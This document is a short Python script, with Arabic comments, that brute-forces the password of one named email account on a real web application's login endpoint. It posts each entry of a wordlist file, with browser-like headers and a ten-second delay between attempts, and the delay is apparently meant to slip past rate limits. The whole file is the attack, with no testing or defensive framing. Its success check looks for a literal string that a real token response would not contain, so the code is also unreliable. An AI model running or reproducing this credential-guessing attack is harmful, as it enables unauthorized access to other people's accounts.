import requests
import time

# URL والبيانات الأساسية
url = "https://app.us.luzmo.com/auth/vi"
headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "https://app.us.luzmo.com/",
    "Content-Type": "application/json",
    "Origin": "https://app.us.luzmo.com",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=1",
    "Te": "trailers"
}

# قراءة ملف wordlist
with open("wordlist.txt", "r") as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()
    data = {
        "email": "sohepo1788@godsigma.com",
        "password": password
    }
    response = requests.post(url, headers=headers, json=data)

    response_code = response.status_code
    if '{"token"}' in response.text:
        print(f"Success! Password found: {password} (Response Code: {response_code})")
        break
    else:
        print(f"Attempt with password {password} failed. (Response Code: {response_code})")
    
    # Time Between Requests 
    time.sleep(10)
